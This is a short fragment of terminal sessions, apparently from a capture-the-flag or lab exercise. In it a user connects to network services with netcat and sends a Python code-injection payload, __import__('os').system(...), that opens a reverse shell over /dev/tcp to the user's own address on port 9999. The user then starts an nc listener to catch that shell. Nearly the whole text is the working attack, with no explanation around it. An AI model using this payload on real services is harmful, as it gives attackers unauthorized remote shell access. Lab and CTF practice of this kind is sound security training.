...
```
matis@ThinkPad:~$ netcat 193.250.183.197 12781
d
...
```
matis@ThinkPad:~$ netcat 10.33.72.233 13337
z
Hello__import__('os').system('sh -i >& /dev/tcp/10.33.79.175/9999 0>&1')

```

```
matis@ThinkPad:~$ nc -lvn 9999
